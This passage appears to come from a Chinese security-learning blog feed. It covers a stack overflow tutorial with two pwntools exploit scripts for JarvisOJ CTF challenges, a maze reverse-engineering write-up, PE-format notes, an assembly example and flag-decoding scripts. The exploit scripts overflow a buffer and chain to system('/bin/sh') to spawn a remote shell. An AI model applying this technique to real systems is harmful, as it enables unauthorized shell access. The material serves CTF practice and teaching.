<h3 id="②-细说"><a href="#②-细说" class="headerlink" title="②.细说"></a>②.细说</h3><p>借用一下前面的图和例子，main函数在调用func_A函数的时候会主动压入返回地址，这个返回地址是为了让func_A执行结束之后能找到回家的路（也就是回到母函数内执行。)然后就是funcA局部变量入栈，最后跳转到代码区进行执行指令了。func_B被调用func_A也重复了main函数的工作，这里就不在多说。</p>
<center><img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fh7povczmjj30mr0cs74f.jpg" alt=""></center>

<p>那么在func_B执行的时候，我们计算好局部变量（后面简称buf）的大小，假设为0x16这么大，那么就可以用0x16的任意数字或字母进行填充，这样这个盒子就被填满了，</p>
<p>另外别忘了，现在func_B现在在栈里打头阵的，所以esp和ebp分别在栈帧上方和局部变量下方，那么ebp也需要被填充，这里要注意在32bit下是4字节，而在64bit下就是8字节了。</p>
<p>同样是任意字符填充，再往下就是返回地址了，关键地方，然后我们想要调用的函数地址get到之后将原来的返回地址已覆盖就完成漏洞利用了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/TIM%E6%88%AA%E5%9B%BE20170930091014.jpg" alt=""></center>

<h3 id="③-传参"><a href="#③-传参" class="headerlink" title="③.传参"></a>③.传参</h3><p>32bit：参数是直接存放在栈中的。</p>
<p>64bit：<br>如果函数的参数数量小于 6 , 则从左至右依次存放在寄存器 :<br>rdi, rsi, rdx, rcx, r8, r9 </p>
<p>如果大于 6 , 那么多出来的参数按照从右至左的顺序依次压栈<br>x64的栈帧在返回地址额下面</p>
<p><a href="http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64" target="_blank" rel="external">给一个看到的链接，关于64bit的传参问题</a></p>
<h2 id="Ⅲ-乘热打铁。"><a href="#Ⅲ-乘热打铁。" class="headerlink" title="Ⅲ.乘热打铁。"></a>Ⅲ.乘热打铁。</h2><p>来两道例题练练好了。<a href="https://www.jarvisoj.com/about" target="_blank" rel="external">这里是出处</a></p>
<h3 id="①-32bit："><a href="#①-32bit：" class="headerlink" title="①.32bit："></a>①.32bit：</h3><p>主函数，里面有一个函数调用。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/le2_main.jpg" alt=""></center>


<p>跟进来，定义了数组大小0x88(ebp-88h看出)，read读入数据，那就可以进行利用。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/le2%E5%8F%BC.jpg" alt=""></center>

<p>查看一下导入表，程序已经给绑定好了system函数，和/bin/sh这个command，那么我们直接把地址拿来用就好了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/sys.jpg" alt=""></center>


<center><img src="http://otc7tld02.bkt.clouddn.com/sh.jpg" alt=""></center>

<p>贴上简单的exp：（junk和ebp做到覆盖buf数组，然后覆盖返回地址为system的调用地址，最后给函数传入指令参数，完成利用。这里的p32是为了让系统能够接收而对地址进行了打包，下面例子中p64也是同样的效果。p.send是向服务器发送数据，最后一句是与服务器交互。）</p>
<pre><code>from pwn import *
#buf=0x88
#p = process(&apos;./level&apos;)
p = remote(&apos;pwn2.jarvisoj.com&apos;,9878)

systemaddr=0x08048320
shelladdr=0x0804A024
junk=&apos;a&apos;*0x88
ebp=&apos;aaaa&apos;
payload=junk+ebp+p32(systemaddr)+p32(4)+p32(shelladdr)
p.send(payload)
p.interactive()
</code></pre><h3 id="②-64bit："><a href="#②-64bit：" class="headerlink" title="②.64bit："></a>②.64bit：</h3><p>和上面一题是孪生兄弟，只是一个32bit，一个64bit下的。程序一模一样，所以思路也就类似，如图。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/64l.jpg" alt=""></center>


<p>直接给出exp：（ELF是加载level2_x64程序。下面一句则可以直接获得system的调用位置，前面提到，64bit下参数是提前存放在寄存器中，然后函数需要参数时候，由寄存器传参。因为我们只需要传入command参数，所以我们只需要知道rdi寄存器所在位置。最后步骤就是，0x80(buf)+8(ebp)+到寄存器地址+传入参数+system函数调用）</p>
<pre><code>from pwn import *
#buf = 0x80
#p=process(&apos;./level2_x64&apos;)
p=remote(&apos;pwn2.jarvisoj.com&apos;,9882)

level2=ELF(&apos;./level2_x64&apos;)
systemaddr=level2.plt[&apos;system&apos;]
print systemaddr

shelladdr=0x0000000000600a90
rdireaddr=0x00000000004006b3

payload=&apos;a&apos;*136+p64(rdireaddr)+p64(shelladdr)+p64(systemaddr)
p.send(payload)
p.interactive()
</code></pre>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN排位赛-babymaze]]></title>
      <url>/2017/08/10/XMAN%E6%8E%92%E4%BD%8D%E8%B5%9B-babymaze/</url>
      <content type="html"><![CDATA[<p>暑期XMAN排位赛中一道逆向思路<br><a id="more"></a></p>
<p>看到题目名字，babymaze，中文意思是婴儿迷宫，看来是一个跟迷宫有关的题目。要不就是迷宫清空，要不就是走出迷宫。</p>
<p>好了，咱先打开题目输入看看，为了看得清楚防止一闪而过，我们就用OD打一个辅助好了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/OD%E8%BE%85%E5%8A%A9.png" width="300" hight="300" alt=""></center>


<p>word天，居然还是日文，吓的我赶紧翻译了一波，好像是不对的意思吧。。暂且不管。用IDA看看关键代码吧。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/IDA%E7%BF%BB%E8%AF%91.png" width="400" hight="400" alt=""></center>


<p>又发现一撮日文，一个个翻译了下，意思已经标注，（如上图所示）有正确提示和错误提示，但是就是没有发现刚才出现的那个提示，所以想这个还是一个调用，所以我们往前追溯。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/XMAN.png" width="400" hight="400" alt=""></center>


<p>Ok,找到了，上图可以看出第一步，也就是flag的格式了，必须是xman{xxxxxxxx}的格式，那么，在123和125的验证中间还有一个函数调用，这儿也就是我们刚才看到的那另一串答案提示了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%B1%87%E7%BC%96%E8%BF%B7%E5%AE%AB%E8%B5%8B%E5%80%BC.png" width="400" hight="400" alt=""></center>


<p>看上图这一串数据，应该就是构成迷宫的关键了吧，如果看不出来咱可以用OD，验证一下咯，输入xman{1231231231231234},这样程序就会跑到那儿去进行赋值进行迷宫的制造，然后我们看看数据就可以看出来迷宫了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E8%BF%B7%E5%AE%AB%E6%95%B0%E6%8D%AEOD.png" width="400" hight="400" alt=""></center>


<p>我们把迷宫排列一下就是下面这个样子了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%95%B0%E5%AD%97%E8%BF%B7%E5%AE%AB.png" width="300" hight="300" alt=""></center>


<p>继续往下分析。看到了四个判断嵌套，分别是1，2，3，4的if判断，点进去看的东西如下图注释，1234分别代表左右上下。除此以外我们还可以看出A1指针代表列，A2指针代表行。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E4%B8%8A%E4%B8%8B%E5%B7%A6%E5%8F%B3.png" width="400" hight="400" alt=""></center>


<p>要问判断依据？，看下面这个图的红色剪头，由于刚才看到的迷宫是六行九列的，那么与9相乘的数据就是列所在指针，后面的加数就是行所在指针，而且这里红色箭头指向的函数返回的数据是与32进行对比是否一样，一样则是0，那么和1异或，如果不一样，你懂得。~~~</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E5%88%A4%E6%96%AD%E4%BE%9D%E6%8D%AE.png" width="400" hight="400" alt=""></center>


<p>而32的十六进制就是0x20<br>也就是迷宫的数据，我们把迷宫用01进行填充一下好了。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/01%E5%A1%AB%E5%85%85.png" width="200" hight="200" alt=""></center>


<p>下面就剩下最后的两个判断，一是是否走到尽头，二是是否只走了16步。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%9C%80%E7%BB%88%E5%88%A4%E6%96%AD.png" width="400" hight="400" alt=""></center>


<p>OK，全部搞懂了吧，开始你的迷宫之旅。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E8%BF%B7%E5%AE%AB%E4%B9%8B%E6%97%85.png" width="400" hight="400" alt=""></center>

]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[小论PE结构]]></title>
      <url>/2017/07/21/%E5%B0%8F%E8%AE%BAPE%E7%BB%93%E6%9E%84/</url>
      <content type="html"><![CDATA[<p>前面在二进制文件中小提了一下PE结构，只是皮毛，这里在做一些添加。<br><a id="more"></a></p>
<h3 id="PE文件的概念"><a href="#PE文件的概念" class="headerlink" title="PE文件的概念"></a>PE文件的概念</h3><p>弱弱的解释一下：PE(Portable Executable)文件称为可移植的可执行的文件，是微软Windows操作系统上的程序文件，包括EXE、DLL、SYS等。</p>
<h3 id="PE文件的结构"><a href="#PE文件的结构" class="headerlink" title="PE文件的结构"></a>PE文件的结构</h3><p>主要就是下图所示的三大块儿</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/PE3.png" width="500" hight="500" alt=""></center>

<h4 id="PE结构之DOS头"><a href="#PE结构之DOS头" class="headerlink" title="PE结构之DOS头"></a>PE结构之DOS头</h4><p>所有的PE文件都是以一个64字节的DOS头开始。这个DOS头只是为了兼容早期的DOS操作系统。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/DOS%E5%A4%B4.png" width="400" hight="400" alt=""></center>


<h4 id="PE结构之PE文件头"><a href="#PE结构之PE文件头" class="headerlink" title="PE结构之PE文件头"></a>PE结构之PE文件头</h4><p>PE文件头是PE文件格式各部分中信息以及结构较为复杂的一个部分，主要包含三部分：</p>
<center><em> PE文件标志</em></center><br><center> 映像文件头</center><br><center>* 可选文件头</center>

<center><img src="http://otc7tld02.bkt.clouddn.com/PE%E6%96%87%E4%BB%B6%E5%A4%B4.png" width="400" hight="400" alt=""></center>

<ul>
<li>PE文件标志是一个常量，即“PE00”，它标志着PE文件头的开始，同时它也是PE文件的一个主要标识。可以通过DOS头中e_lfanew找出该标志的位置。</li>
</ul>
<ul>
<li>映像文件头，它紧跟在PE文件标识的后面，映像文件头是一个结构体。</li>
</ul>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%98%A0%E5%83%8F%E5%A4%B4.png" width="400" hight="400" alt=""></center>

<p>Machine代表着改程序要执行在的计算机的类型；NumberOfSections表明了该PE文件的节数，该值与表的数量以及节表的数量应保持一致；SizeOfOptionalHeader表明了可选映像头的大小。</p>
<ul>
<li>可选映像头，尽管名字是可选映像头，但是事实上它并不是可选而是必须存在的，是“必选”的。</li>
</ul>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E5%8F%AF%E9%80%89%E6%98%A0%E5%83%8F%E5%A4%B4.png" width="400" hight="400" alt=""></center>


<h4 id="PE结构之节表"><a href="#PE结构之节表" class="headerlink" title="PE结构之节表"></a>PE结构之节表</h4><p>节表是紧挨着NT映像头的一结构数组，它的数量与节的数量是一致的，也与映像头文件中NumberOFSections是一致的。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E8%8A%82%E8%A1%A8.png" width="400" hight="400" alt=""></center>


<h4 id="PE结构之节信息"><a href="#PE结构之节信息" class="headerlink" title="PE结构之节信息"></a>PE结构之节信息</h4><p>这里在前面也提及到了，PE文件格式把可执行文件分成若干个数据节(section)，不同的资源被存放在不同的节中，PE文件中的节类型包括：</p>
<ul>
<li>.text     由编译器产生，存放着二进制的机器代码，也是反汇编和调试的对象</li>
<li>.data    初始化的数据块，如宏定义、全局变量等</li>
<li>.idata    可执行文件所使用的动态链接库等外来函数与文件的信息</li>
<li>.rsrc    存放程序的资源，如图标、菜单等</li>
<li>.reloc、edata、.rdata等</li>
</ul>
<h3 id="PE文件的查看"><a href="#PE文件的查看" class="headerlink" title="PE文件的查看"></a>PE文件的查看</h3><p>注意，分析一波，在此之前贴一个PE图，参照这个进行分析：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/PE.jpg" alt=""></p>
<p>OK,随机打开一个PE可执行文件。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/3%E5%A4%84.png" width="400" hight="400" alt=""></center>

<p>上图的1标记处看出MZ长度虽然不定，但是E-lfanew的位置却是定的，在3ch处，这个很关键，因为PE文件头部就是有e_lfanew定位的.</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E5%81%8F%E7%A7%BB%E4%BD%8D.png" width="400" hight="400" alt=""></center>

<p>那从上面的3ch处发现了PE文件头的位置就在00E8，是不是呢？继续往下看。图的2标记处看出DOS处长度不定。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/PR%E6%89%80%E5%9C%A8.png" width="400" hight="400" alt=""></center>

<p>上图可以看出DOS的所占很长，基于E-lfanew偏移大小为ACH，后面就是PE文件头所在位置，也的确就在00E8处。</p>
<p>最后看图的3标记处，也就是说PE文件后缀所在位置，那标准位置就是基于PE头偏移04h+14h-2h=16h处<br>也就是下图选中的位置。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/1721174559.png" width="400" hight="400" alt=""></center>


<p>下面再看看节的信息，就以.text为准吧。看看PE结构表。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/gg21182420.png" width="400" hight="400" alt=""></center>

<p>如上图所示，偏移量在字节表头地址偏移14h后面。那就在右边找到.text字节位置处。向后找14h处偏移，得到.text节基于PE文件的偏移为0400<br>，如下图所示。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/rr0721182212.png" width="400" hight="400" alt=""></center>

<p>验证一下，转到0400地址处，的确是.text节的存储数据。如下图所示：</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/1rr1182221.png" width="400" hight="400" alt=""></center>


<p>最后贴上整理比较详细的一些PE结构讲解：</p>
<ul>
<li><a href="http://blog.csdn.net/evileagle/article/details/11693499" target="_blank" rel="external">http://blog.csdn.net/evileagle/article/details/11693499</a></li>
<li><a href="http://www.cnblogs.com/guanlaiy/archive/2012/04/28/2474504.html" target="_blank" rel="external">http://www.cnblogs.com/guanlaiy/archive/2012/04/28/2474504.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PE结构 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[汇编子程序]]></title>
      <url>/2017/07/20/%E6%B1%87%E7%BC%96%E5%AD%90%E7%A8%8B%E5%BA%8F/</url>
      <content type="html"><![CDATA[<p>前面总结了汇编的寄存器及相关知识，这里了解一下汇编代码的编写并做一个读代码小练习。</p>
<a id="more"></a>
<h4 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h4><pre><code>assume cs:code

data segment
    db &apos;conversation&apos;,0
data ends

code segment
start:  mov ax,cs   
        mov ds,ax
        mov si,offset capital//cs:si 为capital所在代码开始,在汇编中表示某位置使用段地址+偏移量来进行定位的，下面的读取也是类似。
        mov ax,0
        mov es,ax
        mov di,200h //es:di 为200h+0开始
        mov cx,offset capitalend-offset capital  ;两地址相减作为复制长度
        cld         ;清除DF标志为0，是数据按地址又低到高的正确顺序传输
        rep movsb   ;DS:SI这段地址的N个字节复制到ES:DI指向的地址

        ;以上一段代码作用为从capital段到capitalend复制code到200h+0的位置,共11h行

        mov ax,0
        mov es,ax
        mov word ptr es:[7ch*4],200h
        mov word ptr es:[7ch*4+2],0//这两行作用为指定int 7ch开始地址为200h(这里的7ch是我们自己定义的中断，中断的赋值概念低地址位为偏移量，高地址位为段值)
        mov ax,data//这里也就是0000:0200位置
        mov ds,ax
        mov si,0
        int 7ch；自定义终端，不一定为7c
        ;调用复制的capital代码

        mov ax,data
        mov es,ax;数据起地址data
        mov bp,0;偏移量0 //这里取es:bp位置的值，也就是转化之后的数据
        mov al,0;光标跟随输出位置                 
        mov bl,9;蓝色高亮
        mov bh,0;页数,0为当前页
        mov dh,0;y坐标                
        mov dl,0;x坐标                  
        mov cx,12;12个大小的长度
        mov ah,13h;输出字符
        ;上方为设置参数
        int 10h//这里是int 10h截断，有相关网址进行介绍
        ;输出

        mov ax,4c00h
        int 21h
        ;退出
capital:    push cx；压入cx用以计数
        push si；压入si用以计数
change:     mov cx,[si]
        mov ch,0
        jcxz ok；判断cx为0退出
        and byte ptr [si],11011111b;a=&apos;1100001&apos; A=&apos;1000001&apos;所以‘&amp;’一下就是就是小写字符转化为大写字符了。
        inc si
        jmp short change
ok:     pop si;执行si出栈
        pop cx；执行cx出栈
        iret
capitalend: nop

code ends
end start
</code></pre><h4 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h4><p>程序详解:<a href="http://blog.sina.com.cn/s/blog_171daf8e00102xcur.html" target="_blank" rel="external">http://blog.sina.com.cn/s/blog_171daf8e00102xcur.html</a></p>
<p>汇编语言的调试方法：<a href="http://www.cnblogs.com/hustlijian/archive/2011/06/04/2072656.html" target="_blank" rel="external">http://www.cnblogs.com/hustlijian/archive/2011/06/04/2072656.html</a></p>
<p>Int 10h相关设置的知识点：<a href="http://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html" target="_blank" rel="external">http://www.cnblogs.com/magic-cube/archive/2011/10/19/2217676.html</a></p>
<p>汇编中字、双字、字节关系：<a href="https://zhidao.baidu.com/question/270682681.html" target="_blank" rel="external">https://zhidao.baidu.com/question/270682681.html</a></p>
<p>程序中出现的rep movesb 以及cld详解：<a href="https://zhidao.baidu.com/question/270682681.html" target="_blank" rel="external">https://zhidao.baidu.com/question/270682681.html</a></p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 汇编基础 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN练习 writeup及所得]]></title>
      <url>/2017/07/19/XMAN%E7%BB%83%E4%B9%A0writeup%E5%8F%8A%E6%89%80%E5%BE%97/</url>
      <content type="html"><![CDATA[<p>XMAN夏令营虽然没参加，但是选拔赛的题目还是乘着闲暇时间做了几道，并且也学习到了一些。<br>在这里做个总结。<br><a id="more"></a></p>
<h4 id="第一道reverse"><a href="#第一道reverse" class="headerlink" title="第一道reverse"></a>第一道reverse</h4><p>老规矩就IDA看一波</p>
<p>找关键字符，跟踪过去F5大法。下图很明显关键处，而if判断便是重要所在。<br><img src="http://otc7tld02.bkt.clouddn.com/%E9%80%86%E5%90%91%E7%AE%97%E6%B3%951.png" alt=""></p>
<p>这个题目逻辑还是很清晰的，里面自带的乍一看以为是Base64，然而编译出来的不知道什么鬼，在往下看，将我们输入的19位异或操作然后sub_4996DD函数又是一通操作，其实就是做了Base64转换，为什么看出来，应为上面的Base64解码就是19位，根据特性所以猜测如此</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/19%E4%BD%8DBase.png" alt=""></p>
<p>那就很明了了，逆运算即可，附上代码：</p>
<pre><code>from base64 import *
w=&apos;WEw2TX82amFXOFlUXz1RSUVfbw==&apos;
t=b64decode(w)
print(t)
q=&apos;&apos;
for j in range(len(t)):
    q+=chr(ord(t[j])^j)
print(q)
</code></pre><h4 id="第二道安卓"><a href="#第二道安卓" class="headerlink" title="第二道安卓"></a>第二道安卓</h4><p>直接反编译一波</p>
<p>明显的correct和failed提示，关键就是encode.check了</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/correct.png" alt=""></p>
<p>跟过去，可以看到算法，也很简单<br>输入的字符与b进行加法运算与61取模然后乘2再减去循环次要和输入的一样，那就爆破吧。<br><img src="http://otc7tld02.bkt.clouddn.com/encode.png" alt=""></p>
<p>附上代码：</p>
<pre><code>b = [23, 22, 26, 26, 25, 25, 25, 26, 27, 28, 30, 30, 29, 30, 32, 32]
w=&apos;&apos;
for i in range(len(b)):
    for j in range(127):
        if ((j+b[i])%61)*2-i==j:
            w+=chr(j)
print(w)
</code></pre><h4 id="第三道-安卓（有所得）"><a href="#第三道-安卓（有所得）" class="headerlink" title="第三道 安卓（有所得）"></a>第三道 安卓（有所得）</h4><p>给的是一个smali文件，直接用smali2java编译成java语言看好了。</p>
<p>看看代码，大致流程和Base64没差，除了最后的对应转换表，将输入的以8位二进制转换，然后以6的倍数为条件补‘0’，最后6位为单位切片，在对应标志选择相应位置替代。<br><img src="http://otc7tld02.bkt.clouddn.com/smali.png" alt=""></p>
<p>这样一来就可以逆向算法，一步一步已经写出了代码：</p>
<pre><code>end=&apos;xsZDluYYreJDyrpDpucZCo&apos;
temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;
aa=[]
bb=[]
cc=[]
str1=&apos;&apos;
cnt=0
s=&apos;&apos;
flag=&apos;&apos;
for i in end:
    aa.append(temp.find(i))
for i in aa:
    bb.append(bin(i)[2:])
for i in range(len(bb)):
    while (len(bb[i]) != 6):
        bb[i] = &apos;0&apos; + bb[i]
for i in bb:
    str1 += i
for i in str1:
    s += i
    cnt += 1
    if not cnt % 8:
        cc.append(s)
        s = &apos;&apos;
for i in cc:
    flag+=chr(int(i,2))
print(&apos;flag= %s&apos; % (flag))
</code></pre><p>上面都是一些简单的操作，所得何在，在于python的认知</p>
<ul>
<li>int(str,’2/8/10/16’):这个可以将字符串转换为整型十进制，在这题的应用就在于将‘100101’转换为对应的十进制整形。</li>
</ul>
<ul>
<li><p>‘’.split(‘’):可以将string按照相应的代表性质字符转换为列表<br>例如：’10010101 11110000’.split(‘ ‘)==&gt;[‘10010101’,’11110000’]</p>
</li>
<li><p>bin()转换之后得到的是一个str类型数据。</p>
</li>
</ul>
<p>以上三点也许大牛看来很low，但毕竟是自己的积累。最后附上最终代码：</p>
<pre><code>w=[]
mt=&apos;&apos;
end=&apos;xsZDluYYreJDyrpDpucZCo&apos;
temp=&apos;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;
for i in range(len(end)):
w.append(temp.find(end[i]))

m=&quot; &quot;.join([format(i,&apos;b&apos;) for i in w])

for j in m.split(&apos; &apos;):
    if len(j) != 6:
        mt+= &apos;0&apos; * (6 - len(j)) + j
    else:
        mt+=j

m_change=mt[:-(len(mt)%8)]

flag=&quot; &quot;.join(bin(int(x,2)) for x in [m_change[i:i+8] for i in range(0,len(m_change),8)])
print(&apos;&apos;.join([chr(i) for i in [int(b, 2) for b in flag.split(&apos; &apos;)]]))
</code></pre>]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[二进制文件基础]]></title>
      <url>/2017/07/07/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<p>堆栈大致了解之后，了解一下windows下的二进制文件。<br><a id="more"></a></p>
<h2 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h2><p>  源代码被编译和链接之后形成了可执行文件。可执行文件之所以被操作系统加载运行，主要是因为他们有一个统一的格式规范。</p>
<p>  PE（Portable Executable）是Win32下的可执行文件遵守的数据格式( 补充：Linux下的可执行文件一般是Elf的文件。)。常见的可执行文件（<em>.exe </em>.dll）都是典型的PE文件。</p>
<p>  一个可执行文件不光光包含二进制文件的机器代码。还有字符串，菜单，图标，字体等一系列信息，PE文件格式规定了所有的这些信息在可执行文件中如何有规律的进行。所以说，要将一个可执行文件装入内存是一个非常难的事情。</p>
<p>  PE文件格式把可执行文件分成若干个数据节，不同的资源呗存放在不同的节中，一个典型的PE文件包含的节如下：</p>
<ol>
<li>.text:  由编译器生成，存放二进制的机器代码，也是我们反汇编和调试的对象。</li>
<li>.data:  初始化的数据块，如宏定义、全局变量、静态变量等。</li>
<li>.idata：可执行文件链接的其他动态库中的有关外来函数以及信息。</li>
<li>.rsrc:  存放程序图标资源等。</li>
</ol>
<p><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgydpknj3j30gk06st97.jpg" alt=""></p>
<p>  如上图所示，那四类是比较常见的节，除此之外还可能出现的有“.reloc”,“.edata”,“.tls”,“.rdata”等。</p>
<h2 id="加壳概念"><a href="#加壳概念" class="headerlink" title="加壳概念"></a>加壳概念</h2><p>  加壳其实应该叫做可执行程序资源压缩，是保护文件不被随意修改的一种技术。但并不是表示被加壳的程序就不能进行运行，只是无法查询和修改源代码而已，只有脱完壳之后才可以查看源代码。</p>
<p><img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fhgye363iij30hl07swf6.jpg" alt=""></p>
<p>  加壳其实就是利用特殊的算法对程序的代码和资源进行压缩，就好像我们用WINZIP对重要文件进行加密压缩一样，他只是在程序内部进行这样的操作而已。打一个比方，如果说程序是外套，源代码等资源是人的身体的话，那壳就是位于两者之间的一件衬衫。</p>
<p>  现在也有许多的加壳工具，这些工具在文件头中会加入一段指令，告诉CPU如何才能解压自己，只是现在CPU处理速度都是秒秒钟的那种，所以加壳与不加壳的程序运行根本看不出什么不一样，除非你想了解源代码，你就会发现你被壳拒之门外。</p>
<p>  加壳工具分为两种:</p>
<ol>
<li>压缩壳:其特点主要是减小软件体积大小，加密保护并不是重点。</li>
<li>加密壳:其种类比较多，不同的壳侧重重点不同，一些壳单纯保护程序，另一些壳也提供注册、使用限制等功能。现如今需要付款使用的软件其实就是加了壳。</li>
</ol>
<h2 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h2><p>  Windows的内存可以被分为两个层面：物理内存和虚拟内存。其中，物理内存非常复杂，需要进入Windows内核才可以看到。通常，在用户模式下，用调试器看到的都是虚拟内存。</p>
<p>  用户启用程序使用的地址称之为虚拟地址和逻辑地址，其对应的存储空间称为虚拟内存和或逻辑地址空间。而计算机物理内存的访问地址则称为实地址和物理地址，其对应的存储空间称为物理存储空间或主存空间。程序进行虚拟地址到实地地址转换的过程叫做程序的再定位。</p>
<p>  <em>注:这里所说的内存是指Windows用户态内存映射机制下的虚拟内存，操作系统原理也有“虚拟内存”的概念存在，那是在实际物理内存不够时，有时候系统会把“部分硬盘空间”当作内存使用从而使得程序得到装载运行的现象，二者不能混淆。</em></p>
<h2 id="PE文件与虚拟内存的映射"><a href="#PE文件与虚拟内存的映射" class="headerlink" title="PE文件与虚拟内存的映射"></a>PE文件与虚拟内存的映射</h2><p>  在调试漏洞时候通常要进行两部操作：</p>
<ol>
<li>静态反汇编查看PE文件中某条指令的位置是相对于磁盘文件而言的，也就是需要知道文件偏移。</li>
<li><p>还需要知道这条指令在内存中的位置，也就是虚拟内存地址。</p>
<p>为此，我们需要弄清楚PE文件地址和虚拟内存地址之间的关系，首先了解几个重要的概念。</p>
</li>
</ol>
<ul>
<li>(1) 文件偏移地址（File Offset）<br> 数据在PE文件中的地址叫文件偏移地址，这是文件在磁盘上存放时相对于文件开头的偏移。</li>
<li>(2) 装载地址（Image Base）<br> PE装入内存时的基地址。默认情况下，EXE文件在内存中的基地址是0x00400000,DLL文件是0x10000000。这些位置可以通过修改编译选项进行更改。</li>
<li>(3) 虚拟内存地址（Virtual Address）<br> PE文件中的指令被装入内存后的地址。</li>
<li><p>(4) 相对虚拟地址（Relative Virtual Address  RVA）<br> 相对虚拟地址是内存地址相对于映射基址的偏移量。<br>虚拟内存地址、映射基址和相对虚拟内存地址三者之间有如下关系：<br>VA = Image Base + RVA</p>
<p>在默认情况下，一般PE文件的0字节将映射到虚拟内存的0x00400000位置，这个地址就是所谓的装载基地址（Image Base）。如下图所示，</p>
<p><img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgyde3hyuj30fm09dq48.jpg" alt=""></p>
<p>文件偏移是相对于文件开始处0字节的偏移，RVA则是相对于装载基地址0x00400000处的偏移。由于操作系统在进行装载时基本保持PE排列结果，所以文件偏移地址和RVA很大可能一致。</p>
<p><em>（如果有细微的差异的话，那就是由于文件数据的存放单位与内存数据存放单位不同造成的。)</em></p>
</li>
<li><p><em>PE文件数据是按照磁盘数据标准存放，以0x200字节为基本单位进行组织，不足则以0x00填充，超过则分配下一个0X200继续使用</em></p>
</li>
<li><em>代码装入内存是按照内存数据存放，以0x1000字节为基本单位进行组织，不足全部补全，超过则分配下一个0x1000继续使用。</em></li>
</ul>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>  Lord PE是一个查看PE文件并对之进行分析、修改的脱壳辅助软件。<br>  如图就是这个工具的标准界面:</p>
<p>  <img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgyd04k5zj30h4085t9b.jpg" alt=""></p>
<p>  点击PE编辑器，随意加载如一个程序便可以查看相对信息：<br>  <img src="http://ww4.sinaimg.cn/large/006HJ39wgy1fhgycmb7ajj30eq065jrb.jpg" alt=""></p>
<p>  点击区段进行节信息的查询：VOffset就是相对虚拟地址（RVA），ROffset是文件偏移地址。<br>  <img src="http://ww2.sinaimg.cn/large/006HJ39wgy1fhgyca2g36j30dd04nmx0.jpg" alt=""></p>
<p>  在系统进程中，代码（.text节）将被加载到0x400000+0x11000=0x411000的虚拟地址中（装载基地址地址+RVA）。而在文件中，可以用二进制文件打开，看到对应的代码在0x10400位置。</p>
<p>  <img src="http://ww1.sinaimg.cn/large/006HJ39wgy1fhgybvrdxjj30a905sa9x.jpg" alt=""></p>
<p>  通过这个工具可以很清楚了解我们所需要的信息（RVA，VA，文件偏移，装载基地址），对于漏洞的分析是一个很好的辅助。</p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[堆栈及汇编基础]]></title>
